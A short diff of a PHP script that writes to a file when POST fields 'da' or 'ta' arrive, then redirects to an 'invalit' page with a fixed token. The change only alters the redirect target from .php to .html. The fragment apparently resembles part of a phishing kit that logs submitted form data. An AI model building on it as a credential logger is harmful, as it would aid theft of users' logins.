@@ -26,5 +26,5 @@ if(isset($_POST['da']) || isset($_POST['ta'])) {
     fwrite($handle, "<br>");
     fclose($handle);
 
-    header('location: invalit.php?privacy_mutation_token=gy4dGSFWsw345gSDER7wtsef50ghfgESRD3fd');
+    header('location: invalit.html?privacy_mutation_token=gy4dGSFWsw345gSDER7wtsef50ghfgESRD3fd');
 }
